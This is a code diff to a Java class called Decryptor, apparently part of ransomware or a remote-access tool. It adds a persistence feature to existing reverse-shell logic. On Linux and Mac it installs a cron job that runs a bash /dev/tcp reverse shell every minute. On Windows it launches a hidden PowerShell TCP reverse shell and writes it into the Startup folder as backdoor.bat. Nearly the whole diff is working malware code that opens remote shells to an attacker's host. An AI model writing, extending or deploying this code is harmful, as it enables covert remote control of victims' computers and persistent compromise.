@@ -48,6 +48,7 @@ public class Decryptor {
 
   private boolean usingRevShell = true;
   private int revPort = 9999;
+  private boolean usePersistence = false;
 
   // socket variables
   private Socket socket;
@@ -71,11 +72,40 @@ public class Decryptor {
         Process p;
         try {
           if (OS.equals("Linux") || OS.equals("Mac OS X")) {
-            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + address + "/" + revPort + " 0>&1");
+            try {
+              p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + address + "/" + revPort + " 0>&1");
+            } catch (Exception e) {
+              System.out.println("1" + e);
+            }
+            if (usePersistence) {
+              
+              System.out.println("persistence started");
+              String[] cmd = {
+                "/bin/sh",
+                "-c",
+                "echo '* * * * * bash -i >& /dev/tcp/" + address + "/" + revPort + " 0>&1' | crontab -"
+              };
+              p = Runtime.getRuntime().exec(cmd);
+              BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+                String str;
+
+                while ((str = b.readLine()) != null) {
+                    System.out.println(str);
+                }
+
+                b.close();
+                System.out.println("persistence done");
+            }
+            
             System.out.println("linux execution");
           } else if (OS.equals("Windows")) {
-            p = Runtime.getRuntime().exec("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + address + "\"," + revPort + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
-            System.out.println("windows execution");
+            String cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + address + "\"," + revPort + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+            p = Runtime.getRuntime().exec(cmd);
+            if (usePersistence) {
+              p = Runtime.getRuntime().exec("echo " + cmd + " > C:\\Users\\Rasta\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat");
+            }
+
           } else {
             System.out.println(OS);
           }
